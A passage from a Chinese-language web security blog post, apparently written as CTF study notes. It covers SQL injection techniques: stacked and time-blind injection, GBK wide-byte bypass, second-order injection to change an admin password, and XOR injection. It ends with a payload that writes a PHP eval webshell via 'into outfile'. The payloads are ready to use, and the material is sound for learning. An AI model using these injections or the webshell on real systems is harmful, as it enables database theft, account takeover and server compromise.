if(ascii(substr(user(),1,1))=114,sleep(3),1);#</span><br></pre></td></tr></table></figure><p>可以看到这条语句是在堆叠注入的基础上结合了时间盲注，我在猜想当攻击对象过滤了and或者or此时应该就是堆叠注入的优势吧</p><h2 id="六-宽字节注入"><a href="#六-宽字节注入" class="headerlink" title="六.宽字节注入"></a>六.宽字节注入</h2><p>敏感函数 &amp; 选项</p><ul><li><code>addslashes()</code>函数：返回在预定义字符之前添加反斜杠的字符串</li><li><code>magic_quotes_gpc</code>选项：对 POST、GET、Cookie 传入的数据进行转义处理，在输入数据的特殊字符如 单引号、双引号、反斜线、NULL等字符前加入转义字符<code>\</code>，在高版本 PHP 中（&gt;&#x3D;5.4.0）已经弃用</li><li><code>mysql_real_escape_string()</code>函数：函数转义 SQL 语句中使用的字符串中的特殊字符</li><li><code>mysql_escape_string()</code>函数：和<code>mysql_real_escape_string()</code>函数基本一致，差别在于不接受连接参数，也不管当前字符集设定</li></ul><p>宽字节注入的本质是开发者设置<strong>数据库编码与 PHP 编码为不同的编码格式从而导致产生宽字节注入</strong>，例如当 Mysql 数据库使用 GBK 编码时，它会把两个字节的字符解析为一个汉字，而不是两个英文字符，这样，如果我们输入一些特殊的字符，就会形成 SQL 注入</p><p>但是，如果我们输入<code>%df’</code>，它会变成<code>%df%5c%27</code>，这里，%df%5c是一个宽字节的GBK编码，它表示一个繁体字“運”</p><p>因为 GBK 编码的第一个字节的范围是 129-254，而<code>%df</code>的十进制是 223，所以它属于 GBK 编码的第一个字节，而<code>%5c</code>的十进制是 92，它属于 GBK 编码的第二个字节的范围 64-254，所以，<code>%df%5c</code>被数据库解析为一个汉字，而不是两个英文字符</p><p>（可以抓包来看是否设置gbk编码）</p><p><img src="/undefined/f8b7/6.png" alt="image-20240309205103412"></p><p>使用其他宽字节<br>不仅仅只是使用%df’ 进行宽字节绕过也可以使用其他的宽字节，只有满足字符串编码的要求<br>常见使用的宽字节就是%df,其实当我们输入第一个ascill大于128就可以，转换是将其转换成16进制，eg:129转换0x81,然后在前面加上%就是%81<br>GBK首字节对应0x81-0xfe(129-239),尾字节对应0x40-0xfe(64-126)(除了0x7f【128】)<br>比如一些 %df’ %81’ %82’ %de’ 等等（只有满足上面的要求就可以）</p><p>数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df%27%20union%20select%201,database()%23</span><br></pre></td></tr></table></figure><h2 id="七-二次注入"><a href="#七-二次注入" class="headerlink" title="七.二次注入"></a>七.二次注入</h2><p>一般对于已知晓账户的可修改密码的SQL注入</p><p>注册一个账号 ：admin’#<br>密码：123456</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>我们来看现在sql语句变成什么样子了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>我们可以在不知道admin的密码的情况下修改密码，实现登录管理员账户</p><h2 id="八-异或注入"><a href="#八-异或注入" class="headerlink" title="八.异或注入"></a>八.异或注入</h2><p>例如单引号被过滤时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2^(if(ascii(mid(user(),1,1))&gt;0,0,1))</span><br></pre></td></tr></table></figure><p>判断存在注入，2的二进制（10）xor 0的二进制（00）结果是10，所以还是2</p><h2 id="九-sql写入木马"><a href="#九-sql写入木马" class="headerlink" title="九.sql写入木马"></a>九.sql写入木马</h2><p>对于一些知道目录路径的题目</p><p>[SUCTF2018 MultiSQL](<a href="https://buuoj.cn/challenges#[SUCTF">https://buuoj.cn/challenges#[SUCTF</a> 2018]MultiSQL)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:1,id=3 union select 1,&quot;&lt;?php @eval($_REQUEST[a])?&gt;&quot; into outfile &quot;绝对路径+任意写入php&quot;#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
